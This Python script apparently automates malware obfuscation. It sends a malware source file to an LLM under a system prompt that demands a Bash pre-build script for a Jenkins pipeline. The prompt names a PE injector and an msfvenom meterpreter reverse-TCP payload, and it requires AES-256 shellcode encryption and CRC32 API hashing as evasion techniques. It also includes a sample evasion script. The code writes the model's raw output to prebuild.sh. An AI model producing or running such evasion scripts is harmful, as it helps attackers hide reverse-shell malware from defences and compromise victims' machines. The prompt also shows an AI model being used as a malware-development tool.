from openai import OpenAI

import json


SYSTEM_PROMPT = r"""
You are creating a production-grade pre-build obfuscation script that MUST follow these rules:

1. Output Format:
- Respond ONLY with valid Bash script content
- Properly escape all special characters for Bash
- Use this pattern for single quotes inside double-quoted strings: `'"'"'`
- Never leave unescaped quotes or shell special characters
- The output should always start with #!/bin/bash, and end with the last command in the script. Nothing else should be include in the response. Again, respond ONLY with valid Bash script conte.t

2. Pipeline Requirements:
- Must work with Jenkins environment variables:
  SHELLCODE_PATH=src/Simple/PE-Injector/base.cpp
  MALWARE_PATH=src/Simple/PE-Injector/PE-Injector.cpp
  EXECUTABLE_NAME=injector.exe
- Preserve original compilation command (DO NOT INCLUDE COMPILATION STEP IN PRE-BUILD SCRIPT, THIS WILL BE RUN AFTER THE PRE-BUILD SCRIPT IS RAN IN A DIFFERENT STAGE IN THE PIPELINE):
  x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi
- Shellcode is already generated in a previous stage in the pipeline using the following command (DO NOT INCLUDE SHELLCODE GENERATION WITHIN THE PRE-BUILD SCRIPT), and the pre-build script must work with the already generated shellcode:
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x64/xor_context C_HOSTNAME=$HOSTNAME -f c -o base.cpp

3. Required Evasion Techniques:
- AES-256-CBC encryption with runtime decryption
- CRC32 API hashing with dynamic resolution

4. Safety:
- POSIX-compliant, non-interactive
- Directly executable in Jenkins' Bash environment

EXAMPLE OUTPUT:
#!/bin/bash
# Install dependencies
apt-get update && apt-get install -y openssl xxd mingw-w64 git
# Encrypt shellcode
KEY=$(openssl rand -hex 32)
IV=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -in "$SHELLCODE_PATH" -out encrypted.bin -K $KEY -iv $IV
xxd -i encrypted.bin | sed "s/unsigned char .*\[/const unsigned char buf[] = [/g" > "$SHELLCODE_PATH"
# Obfuscate API calls
sed -i "s/GetModuleHandleA/dynamic_resolve('"'"'GetModuleHandleA'"'"')/g" "$MALWARE_PATH"
"""


class Client:
    def __init__(
        self, api_key: str, base_url: str, shellcode_path: str, malware_path: str
    ):
        self.client = OpenAI(
            base_url=base_url,
            api_key=api_key,
        )
        self.shellcode_path = shellcode_path
        self.malware_path = malware_path

    def prebuild(self):
        """
        prebuild generates a pre-build script to be ran in the CI/CD pipeline.
        """
        with open(self.malware_path, "r") as file:
            malware = file.read()
            user_prompt = f"$SHELLCODE_PATH: {self.shellcode_path}\n$MALWARE_PATH: {self.malware_path}\nmalware:\n{malware}"

            response = self.client.chat.completions.create(
                model="deepseek-chat",
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": user_prompt},
                ],
            )

            script_content = response.choices[0].message.content.strip()
            print(script_content)

            # Directly write the raw script output
            with open("prebuild.sh", "w") as f:
                f.write(script_content)
                f.write("\n")  # Ensure trailing newline
